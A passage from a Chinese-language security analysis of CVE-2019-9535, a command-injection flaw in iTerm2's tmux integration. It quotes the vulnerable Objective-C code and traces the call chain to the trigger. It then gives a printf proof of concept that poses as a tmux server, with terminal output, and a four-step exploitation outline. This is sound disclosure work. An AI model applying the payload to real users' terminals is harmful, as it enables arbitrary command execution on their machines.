@@ -1,0 +1,130 @@
+        }
+        _tmuxTitleMonitor = [[iTermTmuxOptionMonitor alloc] initWithGateway:tmuxController_.gateway
+                 scope:self.variablesScope
+                 format:tmuxController_.setTitlesString
+                 target:[NSString stringWithFormat:@"@%@", @(self.tmuxWindow)]
+                 variableName:iTermVariableKeyTabTmuxWindowTitle
+                 block:nil];
+        [_tmuxTitleMonitor updateOnce];
+        if (self.titleOverride.length == 0) {
+            // Show the tmux window title if both the tmux option set-titles is on and the user hasn't
+            // already set a title override.
+            self.variablesScope.tabTitleOverrideFormat = [NSString stringWithFormat:@"\\(%@?)", iTermVariableKeyTabTmuxWindowTitle];
+        }
+    }
+而该函数把可控的`tmuxController_.setTitlesString`作为`format`参数，调用`initWithGateway`初始化一个`iTermTmuxOptionMonitor`类，从而导致`iTermTmuxOptionMonitor`的成员变量`_format`是可控的，而后续又会调用`iTermTmuxOptionMonitor`中的成员函数`updateOnce`
+    - (void)updateOnce {
+        if (_haveOutstandingRequest) {
+            DLog(@"Not making a request because one is outstanding");
+            return;
+        }
+        _haveOutstandingRequest = YES;
+        NSString *command = [NSString stringWithFormat:@"display-message -t '%@' -p '%@'", _target, self.escapedFormat];
+        DLog(@"Request option with command %@", command);
+        [self.gateway sendCommand:command
+                   responseTarget:self
+                 responseSelector:@selector(didFetch:)
+                   responseObject:nil
+                            flags:kTmuxGatewayCommandShouldTolerateErrors];
+    }
+    - (NSString *)escapedFormat {
+        return [[_format stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"]
+                stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
+    }
+而在`updateOnce`函数中，将可控的`_format`变量中的`'`替换成`\'`以及`\`替换成`\\`后发送给tmux服务端，由于没有过滤CRLF从而导致后续利用的发生。
+可是，此时的`updateTmuxTitleMonitor`函数并没有被执行，因此问题转变为如何触发`updateTmuxTitleMonitor`的执行。
+在对iTerm2的tmux集成模块源码进行一番阅读后，发现`TmuxGateway.m`中的函数`parseSessionChangeCommand`，该函数在接收到tmux服务端返回的以`%session-changed`开头的命令时被执行，并且该函数最终会调用函数`openWindowsInitial`。
+而在`openWindowsInitial`中，向tmux服务端发送命令`show -v -q -t $%d
+@iterm2_size`并注册了回调函数`handleShowSize`
+    - (void)openWindowsInitial {
+        NSString *command = [NSString stringWithFormat:@"show -v -q -t $%d @iterm2_size", sessionId_];
+        [gateway_ sendCommand:command
+               responseTarget:self
+             responseSelector:@selector(handleShowSize:)];
+    }
+    - (void)handleShowSize:(NSString *)response {
+        NSScanner *scanner = [NSScanner scannerWithString:response ?: @""];
+        int width = 0;
+        int height = 0;
+        BOOL ok = ([scanner scanInt:&width] &&
+                   [scanner scanString:@"," intoString:nil] &&
+                   [scanner scanInt:&height]);
+        if (ok) {
+            [self openWindowsOfSize:VT100GridSizeMake(width, height)];
+        } else {
+            [self openWindowsOfSize:[[gateway_ delegate] tmuxClientSize]];
+        }
+    }
+    - (void)openWindowsOfSize:(VT100GridSize)size {
+        // ......
+        NSString *listWindowsCommand = [NSString stringWithFormat:@"list-windows -F %@", kListWindowsFormat];
+        // ......
+        NSArray *commands = @[ 
+            // ......
+            [gateway_ dictionaryForCommand:listWindowsCommand
+                    responseTarget:self
+                    responseSelector:@selector(initialListWindowsResponse:)
+                    responseObject:nil
+                    flags:0] ];
+        [gateway_ sendCommandList:commands];
+    }
+在`handleShowSize`被回调时，会调用`openWindowsOfSize`向tmux服务端发送一系列tmux命令，其中有一条命令`list-windows -F
+%@`的回调函数是`initialListWindowsResponse`，而该函数最终会通过函数`openWindows`来创建tmux窗口，在这过程中函数`appendRequestsForNode`会被调用。
+由于`appendRequestsForNode`的调用链过长，在此不再赘述，调用链如下：
+    - appendRequestsForNode
+        - appendRequestsForWindowPane
+            - dictForGetPendingOutputForWindowPane
+                - getPendingOutputResponse
+                    - requestDidComplete
+                        - loadTmuxLayout
+                            - openTabWithTmuxLayout
+                                - updateTmuxTitleMonitor // [漏洞触发]
+自此，我们已经可以注入恶意命令到tmux服务端，如下图所示
+但是这里存在一个问题，由于tmux server是由我们伪造的，那么即使注入了恶意的tmux命令，也只是把恶意命令返回给自己（即不存在真正的tmux
+server去处理它），那么所谓的命令注入又是如何执行的呢？
+## 利用
+事实上，所有的tmux命令都经由`TmuxGateway`进行处理，所有待处理的命令都会存放在`TmuxGateway`的`commandQueue_`队列中。当某条命令出错时，所有的待处理命令会被神奇的输出在iTerm2里（包括回车），这就造成了命令注入，一个简单的POC如下：
+    sh-3.2$ printf "\033P1000p%%begin 1337 0 0\n%%end 1337 0 0\n%%CVE-2019-9535\n"
+    ** tmux mode started **
+    Command Menu
+    ----------------------------    esc    Detach cleanly.
+      X    Force-quit tmux mode.
+      L    Toggle logging.
+      C    Run tmux command.
+    Unrecognized command from tmux. Did your ssh session die? The command was:
+    sh-3.2$ display-message -p -F .
+    Detached
+    sh-3.2$ show-option -g -v status
+    sh: show-option: command not found
+    sh-3.2$ list-sessions -F ""
+    sh: list-sessions: command not found
+    sh-3.2$ display-message -p "#{version}"
+    sh: display-message: command not found
+    sh-3.2$ show-window-options pane-border-format
+    sh: show-window-options: command not found
+    sh-3.2$ list-windows -F "#{socket_path}"
+    sh: list-windows: command not found
+    sh-3.2$ list-windows -F "#{session_activity}"
+    sh: list-windows: command not found
+    sh-3.2$ list-clients -F "#{client_cwd}"
+    sh: list-clients: command not found
+    sh-3.2$ show-options -v -g set-titles; show-options -v -g set-titles-string
+    sh: show-options: command not found
+    sh: show-options: command not found
+    sh-3.2$
+综上，漏洞的主要利用过程如下：
+  1. 通过`"\033P1000p%%begin 1337 0 0\n%%end 1337 0 0"`伪装tmux服务端
+  2. 对iTerm2发出的tmux命令返回合法的结果，其中`show-options -v -g set-titles`返回`on`，`show-options -v -g set-titles-string`返回恶意payload
+  3. 向iTerm2发出`%session-changed`通知，用于触发`updateTmuxTitleMonitor`，将恶意命令注入`TmuxGateway.commandQueue_`
+  4. 对iTerm2发出的tmux命令返回非法的结果，触发命令执行
+## 参考
+[1]. [Critical Security Issue identified in iTerm2 as part of Mozilla Open
+Source Audit](https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/)
+[2]. [tmux source code](https://github.com/tmux/tmux)
+[3]. [Do not send server-controlled values in tmux integration
+mode.](https://github.com/gnachman/iTerm2/commit/538d570ea54614d3a2b5724f820953d717fbeb0c)
+[4]. [iTerm2: tmux Integration](https://www.iterm2.com/documentation-tmux-integration.html)
+[5]. [iTerm2 CVE-2019-9535 分析（待续）](https://nobb.site/2019/10/17/0x52/)
+[6]. [[CVE-2019-9535]
+Iterm2命令执行的不完整复现](https://mp.weixin.qq.com/s/4KcpS4eNGQ8bL6DTM4K0aQ)
+文中有误之处，还请师傅们斧正！
